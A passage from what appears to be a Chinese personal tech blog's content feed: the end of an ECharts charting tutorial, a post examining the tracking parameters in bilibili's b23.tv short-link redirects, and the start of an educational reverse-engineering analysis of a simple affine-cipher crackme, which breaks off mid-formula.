<span class="string">"category"</span>,</span><br><span class="line">		<span class="comment">// boundaryGap: false,</span></span><br><span class="line">	},</span><br><span class="line">	<span class="attr">yAxis</span>: {</span><br><span class="line">		<span class="attr">type</span>: <span class="string">"value"</span>,</span><br><span class="line">	},</span><br><span class="line">	<span class="attr">series</span>: [</span><br><span class="line">		{</span><br><span class="line">			<span class="attr">type</span>: <span class="string">"line"</span>,</span><br><span class="line">		},</span><br><span class="line">		{</span><br><span class="line">			<span class="attr">type</span>: <span class="string">"line"</span>,</span><br><span class="line">		},</span><br><span class="line">		{</span><br><span class="line">			<span class="attr">type</span>: <span class="string">"line"</span>,</span><br><span class="line">		},</span><br><span class="line">		{</span><br><span class="line">			<span class="attr">type</span>: <span class="string">"line"</span>,</span><br><span class="line">		},</span><br><span class="line">	],</span><br><span class="line">	<span class="attr">animationEasing</span>: <span class="string">"quarticOut"</span>,</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<p>然后再将设置对象绑定到之前的 chart 对象上</p>
 <figure class="highlight javascript"><figcaption><span>main.js</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">chart.<span class="title function_">setOption</span>(chartoption);</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>异步更新及获取数据，根据 echarts 官方文档的说法，只要在 jQuery 等工具异步获取完数据后，再调用 setOption 填入数据和配置项就行，非常方便</p>
 <figure class="highlight javascript"><figcaption><span>main.js</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">	$.<span class="title function_">post</span>(<span class="string">"api.php"</span>, { <span class="attr">action</span>: <span class="string">"getfull"</span> }, <span class="string">"json"</span>).<span class="title function_">done</span>(<span class="keyword">function</span> (<span class="params">data</span>) {</span><br><span class="line">		chart.<span class="title function_">setOption</span>({</span><br><span class="line">			<span class="attr">dataset</span>: {</span><br><span class="line">				<span class="attr">source</span>: data.<span class="property">contents</span>, <span class="comment">// 返回数据大致为{"success":true,"contents":[{},{},...]}</span></span><br><span class="line">			},</span><br><span class="line">		});</span><br><span class="line">	});</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>由于数据较多，加载时间较长，我们给 chart 对象添加一个简单的 loading 动画，在数据加载完成后，移除 loading 动画。</p>
 <figure class="highlight javascript"><figcaption><span>main.js</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">chart.<span class="title function_">showLoading</span>();</span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">	<span class="comment">//getting data with jQuery...</span></span><br><span class="line">	chart.<span class="title function_">hideLoading</span>();</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure>
</li>
</ol>
<h2 id="效果">效果</h2>
<ul>
<li>
<p>经过以上步骤后，打开网页，现在显示效果如下，虽然不怎么酷炫，但是已经基本上满足了我们的需求，可以看到大概的数据走向。可以用鼠标滚轮实现局部放大效果。调一调样式，就可以嵌入到一般网页中去使用了。</p>
  <img data-src="/2020/04/02/works/frontend/echarts-drawing/9.png" class="" title="效果">
</li>
</ul>
<img data-src="/2020/04/02/works/frontend/echarts-drawing/10.png" class="" title="局部效果">
<h2 id="后续的思考和启示">后续的思考和启示</h2>
<ul>
<li>其实丁香园网页的开头还有几段 javascript 数据，多加研究的话还有可以值得提取和研究的东西，比如最近新加的国外疫情数据</li>
<li>原来页面真的可以全用 javascript 渲染出来…… 丁香园疫情网页应该用到了类似于 webpack 和客户端渲染的东西，网页 <code>body</code> 元素中全是 javascript 代码
<ul>
<li>具体来讲，应该是在<code>script</code>标签中加载了一些 js 和 css 文件</li>
</ul>
</li>
<li>数据获取部分本来想用 php 一起写掉，但奈何 php 中想要爬虫，只有使用 curl 库来进行抓取，且后续正则提取麻烦，索性放弃了</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
        <category>frontend</category>
        <category>echarts</category>
      </categories>
      <tags>
        <tag>frontend</tag>
        <tag>echarts</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>谈点 b23tv 短链接相关</title>
    <url>/2023/02/17/works/frontend/what-is-behind-b23tv/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>日常网友聊天时，总是会从视频网站中分享点东西，在分享的众多网站中，又以 <a href="https://www.bilibili.com">b 站</a>为主。在这个场景中，我想各位一定也会经常见到不少 b 站的短链接 <code>b23.tv</code> 域名了。这其中背后会有什么故事呢？</p>
<span id="more"></span>
<p>顺便，我并没有参与过这方面的开发，只是以用户角度及可能的相关知识做一些分析。</p>
<h2 id="短域名">短域名</h2>
<h3 id="由来">由来</h3>
<p>顾名思义，短域名一般长度很短，且不带 www。这样的域名出现是为了方便记忆，网民输入网址的时候，不必要输入太长的域名。某些网站会申请一些短域名，然后将它们设置跳转到带 www 的顶级域名上。正因为长度足够短，在社交媒体上分享时，会节省很多字数。</p>
<h3 id="实现">实现</h3>
<p>我们常用的情景有这两种：</p>
<ol>
<li>
<p>同域跳转，将不带 www 的域名直接转发到带 www 的域名，后台如果使用 nginx，会配置成这样：</p>
 <figure class="highlight nginx"><table><tbody><tr><td class="code"><pre><span class="line"><span class="section">server</span> {</span><br><span class="line">	<span class="attribute">listen</span>                  <span class="number">443</span> ssl http2;</span><br><span class="line">	<span class="attribute">listen</span>                  [::]:<span class="number">443</span> ssl http2;</span><br><span class="line">	<span class="attribute">server_name</span>             www.jason0743.ren;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> {</span><br><span class="line">	<span class="attribute">listen</span>      <span class="number">80</span>;</span><br><span class="line">	<span class="attribute">listen</span>      [::]:<span class="number">80</span>;</span><br><span class="line">	<span class="attribute">server_name</span> jason0743.ren;</span><br><span class="line"></span><br><span class="line">	<span class="section">location</span> / {</span><br><span class="line">		<span class="attribute">return</span> <span class="number">301</span> https://www.jason0743.ren<span class="variable">$request_uri</span>;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> {</span><br><span class="line">	<span class="attribute">listen</span>      <span class="number">80</span>;</span><br><span class="line">	<span class="attribute">listen</span>      [::]:<span class="number">80</span>;</span><br><span class="line">	<span class="attribute">server_name</span> www.jason0743.ren;</span><br><span class="line"></span><br><span class="line">	<span class="section">location</span> / {</span><br><span class="line">		<span class="attribute">return</span> <span class="number">301</span> https://www.jason0743.ren<span class="variable">$request_uri</span>;</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这个配置中，主要依靠 <code>location /</code> 块下指定的 301 状态码及跳转地址。这样，用户访问 <code>jason0743.ren</code> 时，会被重定向到 <code>www.jason0743.ren</code>，这样就可以统一使用带 www 的域名了。</p>
<p>根据相关标准，代表永久重定向的 301 状态码会被浏览器缓存，搜索引擎也会将资源的索引转移到新地址上，所以说权重会聚集在带 www 的主域名上。</p>
</li>
<li>
<p>非同域跳转。本文要介绍的 <code>b23.tv</code> 跳转到 <code>bilibili.com</code> 的属于这种情况。一般来说，二字母、二数字、二杂合的域名都是效果非常好的短链接的来源。这样的域名往往依靠注册得到。</p>
<p>马上我们就会看到，它的实现方法也是类似于第一种情况，使用 301、302 状态码和跳转地址来实现。</p>
</li>
</ol>
<p>短网址 - 长网址的对应关系，很容易想到一个数据结构 ——Map。这里我们可以使用一个 Map 来存储短网址和长网址的对应关系，然后根据短网址来查找长网址，再根据长网址来重定向。在实际应用中，这种对应关系往往使用数据库存储。每次生成短链接时，就将它插入数据库中，每插一次，就会关联一个 id，下次可以通过 id 定位到原始链接，然后作后续跳转。</p>
<p>用数字作为 id 是很容易想到的，但是，短网址数据通常是上亿的，如果用户输入过长数字，体验想必也不会太好。所以，我们可以使用一些编码算法，将数字转换成更短的字符串。这里我们可以使用 62 进制，即 0-9、a-z、A-Z，这样就可以用 6 位字符来表示 62 的 6 次方个数字，也就是 568 亿个数字。这样，我们就可以使用 6 位字符来表示一个 id 了。</p>
<p>短链接服务往往是高并发的，业务数据量非常大，不得不分库分表，分库分表的情况下，仍然需要唯一标识数据的 ID，自增 ID 就不太好用了。这时，就需要一些分布式 ID 生成算法的帮助了，比如 Redis 的 incr 命令，Twitter 的雪花算法等。这些东西要展开的话，可能需要额外一篇文章了。</p>
<h2 id="b站短域名到底有没有包含个人信息？">b 站短域名到底有没有包含个人信息？</h2>
<p>现在已经是 2023 年了，在 bing 等各大搜索引擎上也能找到 b 站添加短域名标识符的报告信息了。大家在看到这些信息时，肯定会说” 又有应用收集我信息了，我隐私无了 “吧！但是，你知道这些是什么信息吗？为了让大家明白，我们把访问 b23 短域名的过程来进行一个简单的测试。</p>
<p>从我们手机 B 站 APP 上，随便打开一个视频，然后点击右上角的三个点，选择 “复制链接”。这时你会发现，剪贴板上的内容类似如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">【视频标题】 https://b23.tv/{xxxxxx}</span><br></pre></td></tr></tbody></table></figure>
<p>其中视频标题的右方括号与短链接之间有一个空格。我们将这个短链接拿去测试一下：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 别忘了把short-id换成另外一个合法链接自己测试</span></span><br><span class="line">res = requests.get(<span class="string">"https://b23.tv/&lt;short-id&gt;"</span>)</span><br><span class="line"><span class="built_in">print</span>(res.url)</span><br><span class="line"><span class="comment"># 'https://www.bilibili.com/video/BV{xxxxxxxxx}/?buvid={buvid}&amp;is_story_h5=false&amp;mid={mid}&amp;p=1&amp;plat_id={plat_id}&amp;share_from=ugc&amp;share_medium={medium}&amp;share_plat={platform}&amp;share_session_id={sid}&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp={ts}&amp;unique_k={}&amp;up_id={}'</span></span><br></pre></td></tr></tbody></table></figure>
<p>最后的 <code>url</code> 地址与初始请求地址不同，显然经过了 30x 的重定向，强制忽略重定向再来一遍：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 别忘了把short-id换成另外一个合法链接自己测试</span></span><br><span class="line">res = requests.get(<span class="string">"https://b23.tv/&lt;short-id&gt;"</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># &lt;Response [302]&gt;</span></span><br><span class="line"><span class="built_in">print</span>(res.headers)</span><br><span class="line"><span class="comment"># {'Date': 'Fri, 17 Feb 2023 03:55:30 GMT', 'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '420', 'Connection': 'keep-alive', 'Bili-Trace-Id': '{trace-id}', 'Location': 'https://www.bilibili.com/video/BV{xxxxxxxxx}?{search-params}', 'X-Bili-Trace-Id': '{trace-id}', 'Expires': 'Fri, 17 Feb 2023 03:55:29 GMT', 'Cache-Control': 'no-cache', 'X-Cache-Webcdn': 'BYPASS from blzone06'}</span></span><br></pre></td></tr></tbody></table></figure>
<p><code>Location</code> 响应头的地址与不忽略重定向时的地址相同，这时候我们大致可以描绘出整个请求的过程了。</p>
<pre class="mermaid">graph LR
  A["访问短链接b23.tv/xxx"] --&gt; B["取Location进行302跳转"] --&gt; C["带一堆URL参数的bilibili.com/BVxxxxxx视频页链接"]</pre>
<div class="note warning"><p>看见没，已经有一堆追踪参数了，为了这里演示方便以及不泄露隐私，这里用占位符 <code>{}</code> 替换掉了所有可能引起追踪的地方。</p>
</div>
<p>可以看到在进行 302 跳转时，服务器给出的 <code>Location</code> 响应头已经携带了参数。这些参数中，有一些是与用户相关的，比如</p>
<ul>
<li><code>mid</code> 用户 ID，在 2023 年 4 月 2 日测试时，mid 已经变成了一堆字母和数字，不知道有没有作加密</li>
<li><code>buvid</code> 用户设备 ID</li>
<li><code>plat_id</code> 用户平台 ID</li>
<li><code>share_session_id</code> 分享会话 ID，其格式为 UUID</li>
<li><code>share_tag</code>，没猜到含义</li>
<li><code>share_from</code> 分享来源内容，ugc 为用户生成内容（User Generated Content）</li>
<li><code>share_medium</code> 分享媒介，如安卓手机端的分享值为 android</li>
<li><code>share_source</code> 分享来源，如安卓手机端的分享值为 COPY</li>
<li><code>share_plat</code> 分享平台，如安卓手机端的分享值为 android</li>
<li><code>up_id</code> UP 主 ID，也就是 UP 主空间主页 <code>space.bilibili.com</code> 后面那一串数字</li>
<li><code>timestamp</code> 时间戳，位数为 10 位</li>
</ul>
<p>这些当然利于刻画分享视频用户的行为，便于后期综合到 UP 主的分析中。如<a href="https://member.bilibili.com/platform/data-up/video/dataCenter/play">数据中心 —— 播放</a>中，就使用到了用户的设备信息。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2023/02/17/works/frontend/what-is-behind-b23tv/datacenter-play-1.png" class="" title="数据中心播放统计"></div><div class="group-picture-column"><img data-src="/2023/02/17/works/frontend/what-is-behind-b23tv/datacenter-play-2.png" class="" title="数据中心播放统计"></div></div></div>
<p>而在<a href="https://member.bilibili.com/platform/data-up/video/dataCenter/audience">数据中心 —— 观众</a>中，互动活跃度统计会使用到分享的数据。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2023/02/17/works/frontend/what-is-behind-b23tv/datacenter-audience-1.png" class="" title="数据中心观众统计"></div><div class="group-picture-column"><img data-src="/2023/02/17/works/frontend/what-is-behind-b23tv/datacenter-audience-2.png" class="" title="数据中心观众统计"></div></div></div>
<p>既然分享也算一种互动，如果分享的人是粉丝，则它也会参与到粉丝粘性的计算中。</p>
<img data-src="/2023/02/17/works/frontend/what-is-behind-b23tv/datacenter-audience-3.png" class="" title="粉丝粘性">
<p>在电脑端上获取视频分享链接，就直接是 <code>https://www.bilibili.com/video/BV{xxxxxxx}/?share_source=copy_web&amp;vd_source={}</code> 这种长链接格式了。</p>
<h2 id="总结">总结</h2>
<ul>
<li>一些门户分享网站为了方便统计分析，在 URL 查询字段中会携带各种信息。无论有关无关，总会引起部分用户的不满，手动删除标识符总是一个好习惯。今后我也可能会开发一个工具来解除 “标识符之苦”。</li>
<li>平衡用户体验和隐私保护，也是现在很多国内网站需要优化的地方。希望这些网站多多注意。</li>
<li>写这篇文章的意义，也是基于 “不要人云亦云” 的原则，对这件事有个自己的看法，并以文章的形式记录下来。希望这篇文章能够帮助到大家做进一步的判断，也希望 B 站短链接部门能够做好用户隐私和数据分析的平衡，有所改进吧。</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
        <category>frontend</category>
      </categories>
      <tags>
        <tag>frontend</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向分析 — 仿射加密</title>
    <url>/2019/04/24/experiments/security/reverse/affineenc/</url>
    <content><![CDATA[<p>通过一个简单的仿射加密程序逆向，学习仿射加密在逆向程序中的表示以及如何进行关键点的处理。熟悉了基本的逆向分析方法和流程。</p>
<span id="more"></span>
<h2 id="初识程序">初识程序</h2>
<p>运行初见截图如下：</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/1.png" class="">
<p>在 IDA 中观察主程序流程大致如下图：</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/2.png" class="">
<p>这是一个 32 位 exe 程序，通过试运行，大致观察到程序接受了一个字符串，若满足相应条件，会输出 <code>ok,you really know</code>，否则，会输出 <code>sorry</code>。我们的目标，就是要让程序输出前者。</p>
<h2 id="结构分析">结构分析</h2>
<p>用 32 位 IDA 打开这个程序。</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/3.png" class="">
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/04/24/experiments/security/reverse/affineenc/4.png" class=""></div><div class="group-picture-column"><img data-src="/2019/04/24/experiments/security/reverse/affineenc/5.png" class=""></div></div></div>
<p>在 <code>test ecx,ecx</code> 后，通过不大于转移 (jle) 命令，判断是否跳转到 <code>short loc_40105A</code> 地址上，否则，进入 <code>loc_401047</code> 地址，进行循环，循环结束后仍然进入 <code>loc_40105A</code> 地址，继续进行比较。循环时有 <code>inc eax</code> 操作，说明这里的循环可能是 <code>for</code> 循环。</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/6.png" class="">
<p>继续顺序执行。在 <code>test ecx,ecx</code> 后发生了又一次不大于转移命令，判断是否需要直接跳转到 <code>loc_401062</code> 地址上，在 <code>loc_401062</code> 内部又发生了循环。当不满足小于转移条件时，出循环，继续向下执行。</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/7.png" class="">
<p>看来是要从内存中取字符串了，记下来，可能是分析的重点。</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/8.png" class="">
<p>一堆条件判断和跳转，根据前三条红色路线和绿色路线走，还有循环，略有些复杂。</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/9.png" class="">
<p>终于到结尾了！这一部分就是简单的条件分支结构了。由于整个程序有效代码部分只有一个 <code>main</code> 函数，所以整个程序的结构分析到此就结束了。</p>
<h2 id="逻辑分析">逻辑分析</h2>
<p>首先从 <code>main</code> 函数开始，从 <code>sub</code> 开始数起。</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/10.png" class="">
<p>我们输入的字符串被存放在 <code>esp+68h+var_64</code> 中。然后经过 <code>test</code> 检验，当寄存器的值小于等于 <code>0</code> 时，跳转到 <code>40105A</code> 地址上。否则进入 <code>401047</code> 地址中进行循环。</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/11.png" class="">
<p>从 <code>esp+eax+68h+var64</code> 中，即用户输入的值中取值与 <code>61h</code>、<code>7Ah</code> 进行比较，大体意思即为判断用户输入满足在 <code>"a"~"z"</code> 之间。若不满足条件，跳至 <code>short loc_4010B3</code> 中，而它直接终止了整个函数的运行。</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/12.png" class="">
<p>关键的一步。<code>esp+esi+70h+var_64</code> 中的内容被移入值 <code>eax</code> 中，该段内容经 <code>eax+eax*2-0x11C=3*eax-0x11C</code> 的结果被放入了 <code>eax</code> 中，之后 <code>mod26</code> 运算，得到的结果再加上 <code>61h</code>（<code>a</code> 的 ascii 码表示）构成密文并写入内存的 <code>esp+esi+70h+var64</code> 中。</p>
<img data-src="/2019/04/24/experiments/security/reverse/affineenc/13.png" class="">
<p>根据上述过程，有 <code>3*eax-0x11C=a*eax-a*0x61+b</code>，得到<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="5.345ex" height="1.69ex" role="img" focusable="false" viewBox="0 -665 2362.6 747"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(806.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1862.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="5.119ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 2262.6 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(706.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1762.6,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g></g></g></svg></mjx-container>。即仿射加密函数为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.731ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8279 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1823.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mi" transform="translate(2323.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(3117.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(4118,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(4618,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5007,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5885,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(6370,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mn" transform="translate(6890,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 